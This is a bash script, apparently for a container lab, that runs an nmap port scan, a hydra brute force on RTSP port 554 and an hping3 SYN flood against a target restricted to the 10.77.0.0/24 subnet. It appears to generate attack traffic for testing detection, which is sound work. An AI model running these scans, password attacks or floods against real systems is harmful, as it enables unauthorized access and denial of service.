#!/usr/bin/env bash
# Lab attacks, only against our own containers:  attack scan | brute | dos | all
#   docker compose -f docker-compose.yml -f docker-compose.lab.yml exec -T lab_attacker attack all
set -uo pipefail
TARGET="${TARGET:-10.77.0.10}"
case "$TARGET" in
  10.77.0.*) ;;
  *) echo "refusing to attack $TARGET: the lab only allows 10.77.0.0/24"; exit 2 ;;
esac

scan()  { echo ">> port scan: nmap -sS -p 1-2000 $TARGET"; nmap -sS -T4 -Pn -n -p 1-2000 "$TARGET"; }
brute() { echo ">> brute force on RTSP 554: hydra, 300 wrong passwords"
          timeout 90 hydra -I -w 1 -l admin -P /opt/wordlist.txt -s 554 -t 8 "$TARGET" rtsp /; }   # -I: no restore-file prompt; -w 1: 1 s answer timeout
dos()   { echo ">> SYN flood on 443 for 10 seconds: hping3"; timeout 10 hping3 -S --flood -p 443 "$TARGET" >/dev/null 2>&1 || true; }

case "${1:-}" in
  scan) scan ;;
  brute) brute ;;
  dos) dos ;;
  all) scan; sleep 12; brute; sleep 12; dos ;;     # one capture window between attacks
  *) echo "usage: attack scan|brute|dos|all"; exit 1 ;;
esac
